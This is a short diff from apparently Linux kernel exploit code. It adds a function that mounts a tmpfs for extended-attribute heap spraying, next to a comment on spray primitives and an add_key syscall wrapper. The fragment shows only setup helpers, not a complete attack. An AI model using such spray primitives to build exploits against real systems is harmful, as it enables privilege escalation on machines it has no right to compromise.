@@ -711,7 +711,11 @@ int emptyTimer(int tv_sec)
     options, not a good primitive for spray since 
     the limit size for each account
 */
-
+void simpleXattrInit(){
+    system("mkdir /tmp/tmpfs");
+    system("mount -t tmpfs -o size=50M none /tmp/tmpfs");
+    system("echo wtf > /tmp/tmpfs/sattr");
+}
 int keyAdd(char *description, char *payload, int payload_len){
     return syscall(__NR_add_key, "user", description, payload, payload_len,
                    KEY_SPEC_PROCESS_KEYRING);
